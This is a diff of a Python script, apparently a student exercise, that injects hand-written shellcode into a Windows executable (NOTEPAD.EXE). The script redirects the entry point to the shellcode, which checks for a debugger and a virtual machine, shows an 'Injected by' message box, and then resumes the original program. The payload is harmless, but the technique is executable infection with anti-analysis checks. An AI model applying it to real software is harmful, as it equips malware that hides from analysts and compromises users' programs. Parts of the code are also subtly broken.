@@ -1,38 +1,24 @@
-from importlib.metadata import entry_points
 import pefile
-import pwn
 import os
 import mmap
+import shutil
+import struct
 
-payload = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
-                b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
-                b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
-                b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
-                b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
-                b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
-                b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
-                b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
-                b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
-                b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
-                b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
-                b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
-                b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
-                b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
-                b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
-                b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x74\x79\x58\x68"
-                b"\x65\x63\x75\x72\x68\x6b\x49\x6e\x53\x68\x42\x72\x65"
-                b"\x61\x31\xdb\x88\x5c\x24\x0f\x89\xe3\x68\x65\x58\x20"
-                b"\x20\x68\x20\x63\x6f\x64\x68\x6e\x20\x75\x72\x68\x27"
-                b"\x6d\x20\x69\x68\x6f\x2c\x20\x49\x68\x48\x65\x6c\x6c"
-                b"\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x6a\x40\x53"
-                b"\x51\x52\xff\xd0\xB8\xF0\x50\x45\x00\xFF\xD0")
 
-# Path to pe file
-path = 'C:\\Users\\ADmin\\Desktop\\TestPlace\\NOTEPAD.exe'
-pe = pefile.PE(path)
+def get_message_box_w():
+    address_of_message_box_w = None
+    for entry in pe.DIRECTORY_ENTRY_IMPORT:
+        dll_name = entry.dll.decode('utf-8')
+        if dll_name == "USER32.dll":
+            for func in entry.imports:
+                if func.name.decode('utf-8') == "MessageBoxW":
+                    address_of_message_box_w = func.address
 
-file_alignment = pe.OPTIONAL_HEADER.FileAlignment
-section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
+    if not address_of_message_box_w:
+        print("[-] PE file not imported MessageBoxW")
+        return False
+    print("Address of MessageBoxW: ", hex(address_of_message_box_w))
+    return address_of_message_box_w
 
 # Get the info section about number of sections and last section
 
@@ -40,19 +26,7 @@ section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
 def get_info_section(pe):
     # Get some info about section
     number_of_sections = pe.FILE_HEADER.NumberOfSections
-    last_section = number_of_sections - 1
-    return number_of_sections, last_section
-
-
-def calc_entry_point_va(pe):
-    # Get entry_point and image_base of pe file
-    entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
-    image_base = pe.OPTIONAL_HEADER.ImageBase
-
-    # Calc the entry_point_virtual_address = entry_point + image_based
-    entry_point_va = entry_point + image_base
-
-    return entry_point_va
+    return number_of_sections
 
 # Align function
 
@@ -60,145 +34,101 @@ def calc_entry_point_va(pe):
 def align(value, alignment):
     return ((value+alignment-1) / alignment) * alignment
 
-# Get the virtual_offset and rawoffset
-
-
-def get_virtual_raw_size(pe):
-    raw_size = align(0x1000, file_alignment)
-    virtual_size = align(0x1000, section_alignment)
-    return int(raw_size), int(virtual_size)
-
-
-def get_virtual_raw_offset(pe):
-    virtual_offset = align(pe.sections[last_section].VirtualAddress +
-                           pe.sections[last_section].Misc_VirtualSize, file_alignment)
-    raw_offset = align(pe.sections[last_section].PointerToRawData +
-                       pe.sections[last_section].SizeOfRawData, section_alignment)
-    return int(virtual_offset), int(raw_offset)
-
-
-# Offset = RA - Section RA = VA - Section VA
-
-
-def calc_X_Y_Z(raw_address, section_raw_address, section_virtual_address):
-    return raw_address - section_raw_address + section_virtual_address
-
-# Calc the rel_virtual_address
-
-
-def calc_rel_va(old_entry_point, new_entry_point):
-    return old_entry_point - 0x5 - (new_entry_point + 0x14)
-
 # Create payload
 
 
-def create_payload(x, y, z, new_entry_point, rel_virtual_address):
-    payload = ""
-    first_payload = "\x6A\x00"
-    second_payload = "\x68"
-    return
+def create_shell_code(virtual_address_of_caption, virtual_address_of_text, address_of_message_box_w):
+    shell_code = b'\x33\xC0'
+    shell_code += b'\x40'
+    shell_code += b'\x0F\xA2'
+    shell_code += b'\x0F\xBA\xE1\x1F'
+    shell_code += b'\x72\x22'
+    shell_code += b'\x64\xFF\x35\x30\x00\x00\x00'
+    shell_code += b'\x5A'
+    shell_code += b'\x80\x7A\x02\x01'
+    shell_code += b'\x74\x14'
+    shell_code += b'\x6A\x00'
+    shell_code += b'\x68' + struct.pack("I", virtual_address_of_caption)
+    shell_code += b'\x68' + struct.pack("I", virtual_address_of_text)
+    shell_code += b'\x6A\x00'
+    shell_code += b'\xFF\x15'
+    shell_code += struct.pack("I", address_of_message_box_w)
+    shell_code += b'\xE9' + struct.pack("I", jump_address)
+    shell_code += b'\x00' * 30
+    shell_code += b'\x49\x00\x6e\x00\x66\x00\x6f\x00'
+    shell_code += b'\x00' * 24
+    shell_code += b'\x49\x00\x6E\x00\x6A\x00\x65\x00\x63\x00\x74\x00\x65\x00\x64\x00\x20\x00\x62\x00\x79\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x33\x00\x39\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x30\x00\x34\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x31\x00\x37'
+    return shell_code
 
 
-try:
-    number_of_sections, last_section = get_info_section(pe)
-    # New section offset
-    new_section_offset = (pe.sections[last_section].get_file_offset() + 40)
-
-    # STEP 0x01 - Resize the Executable
-    # Note: I added some more space to avoid error
+def add_more_space(path):
+    # Get original_size and add more space to file pe
     print("[*] STEP 1 - Resize the Executable")
 
     original_size = os.path.getsize(path)
     print("\t[+] Original Size = %d" % original_size)
     fd = open(path, 'a+b')
     map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
-    map.resize(original_size + 0x2000)
+    map.resize(original_size + 0x1000)
     map.close()
     fd.close()
 
     print("\t[+] New Size = %d bytes\n" % os.path.getsize(path))
+    return original_size
 
-    print("\n[*] STEP 2 - Add the New Section Header")
-    print("\nnew section_offset: ", hex(new_section_offset))
 
-    # Get the header section of pe file
-    # get the va_offset, raw_offset
-    virtual_offset, raw_offset = get_virtual_raw_offset(pe)
-    print("\nrsrc virtual address offset: ", hex(virtual_offset))
-    print("rsrc raw address offset: ", hex(raw_offset))
-
-    # get virtual_size, raw_size
-    virtual_size, raw_size = get_virtual_raw_size(pe)
-    print("\nvirtual address size: ", hex(virtual_size))
-    print("raw address size: ", hex(raw_size))
-
-    # Calc the entry_point
-    entry_point_va = calc_entry_point_va(pe)
-    print('\nEntry point va: ', hex(entry_point_va))
-
-    # CODE | EXECUTE | READ | WRITE
-    characteristics = 0xE0000020
-    # Section name must be equal to 8 bytes
-    name = ".axc" + (4 * '\x00')
-
-    # Create the section
-    # Set the name
-    pe.set_bytes_at_offset(new_section_offset, name)
-    print("\tSection name: ", name)
-
-    # Set the virtual size
-    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
-    print("\tVirtual size: ", hex(virtual_size))
-
-    # Set the virtual offset
-    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
-    print("\tVirtual offset: ", hex(virtual_offset))
-
-    # Set the raw size
-    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
-    print("\tRaw size: ", hex(raw_size))
-
-    # Set the raw offset
-    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
-    print("\tRaw offset: ", hex(raw_offset))
-
-    # Set the following fields to zero
-    pe.set_bytes_at_offset(new_section_offset + 24, (12 * b'\x00'))
-
-    # Set the characteristics
-    pe.set_dword_at_offset(new_section_offset + 36, characteristics)
-    print("\tCharacteristics = ", hex(characteristics))
-
-    print("\n[*] STEP 3 - Modify the Main Headers")
-    pe.FILE_HEADER.NumberOfSections += 1
-    print("\tNew number of sections: ", pe.FILE_HEADER.NumberOfSections)
-    pe.OPTIONAL_HEADER.SizeOfImage = virtual_offset + virtual_size
-    print("\tNew Size of image: ", pe.OPTIONAL_HEADER.SizeOfImage)
-
-    pe.write(path)
-
+try:
+    # Path to pe file
+    path = 'C:\\Users\\ADmin\\Desktop\\TestPlace\\NOTEPAD.EXE'
     pe = pefile.PE(path)
-    for section in pe.sections:
-        print(section.Name)
-        
-    number_of_section = pe.FILE_HEADER.NumberOfSections
-    last_section = number_of_section - 1
     
-    print(number_of_section)
+    # Add more space and get the original size
+    original_size = add_more_space(path)
+    number_of_sections = get_info_section(pe)
+    last_section = pe.sections[-1]
 
-    new_ep = pe.sections[last_section].VirtualAddress
-    print("\tNew Entry Point = %s" %
-          hex(pe.sections[last_section].VirtualAddress))
-    oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
+    # Get the image base and old entry points
+    image_base = pe.OPTIONAL_HEADER.ImageBase
+    entry_point_old = pe.OPTIONAL_HEADER.AddressOfEntryPoint
 
-    print("\tOriginal Entry Point = %s\n" %
-          hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
-    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
+    # Calc the last section and raw offset
+    last_section_virtual_offset = last_section.VirtualAddress + \
+        last_section.Misc_VirtualSize
+    last_section_raw_offset = last_section.PointerToRawData + last_section.SizeOfRawData
 
-    print("\n[+]STEP 0x04 - Inject the Shellcode in the New Section")
-    raw_offset = pe.sections[last_section].PointerToRawData
-    pe.set_bytes_at_offset(raw_offset, payload)
-    pe.write(path)
+    # Locate where to inject shell_code
+    raw_address_of_shell_code = original_size
+    raw_address_of_caption = raw_address_of_shell_code + 0x50
+    raw_address_of_text = raw_address_of_shell_code + 0x70
+
+    # Calc X, Y, new entry point
+    virtual_address_of_caption = raw_address_of_caption - \
+        last_section.PointerToRawData + last_section.VirtualAddress + image_base
+    virtual_address_of_text = raw_address_of_text - \
+        last_section.PointerToRawData + last_section.VirtualAddress + image_base
+    new_entry_point = raw_address_of_shell_code - \
+        last_section.PointerToRawData + last_section.VirtualAddress + image_base
+
+    # Calc old entry point
+    entry_points_fix = new_entry_point - image_base
+    jump_address = (entry_point_old + image_base - 5 -
+                    new_entry_point - 45) & 0xffffffff
+
+    # Get the address of message box w
+    address_of_message_box_w = get_message_box_w()
+
+    shell_code = create_shell_code(
+        virtual_address_of_caption, virtual_address_of_text, address_of_message_box_w)
+
+    pe.set_bytes_at_offset(raw_address_of_shell_code, shell_code)
+
+    pe.OPTIONAL_HEADER.AddressOfEntryPoint = entry_points_fix
+    last_section.Misc_VirtualSize += 0x1000
+    last_section.SizeOfRawData += 0x1000
+    pe.OPTIONAL_HEADER.SizeOfImage += 0x1000
+
+    pe.write("C:\\Users\\ADmin\\Desktop\\TestPlace\\INJECTED.EXE")
+    print("Inject Successfully!!")
 
 finally:
     print("\nDone")
